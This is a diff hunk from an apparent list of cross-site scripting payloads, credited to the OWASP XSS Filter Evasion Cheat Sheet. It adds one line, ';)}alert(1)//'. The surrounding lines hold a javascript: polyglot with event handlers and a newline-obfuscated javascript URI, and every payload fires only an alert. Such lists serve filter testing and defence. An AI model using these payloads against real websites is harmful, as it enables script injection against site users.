@@ -4,6 +4,7 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 
 %0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
 
+ ;)}alert(1)//
 
 from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 
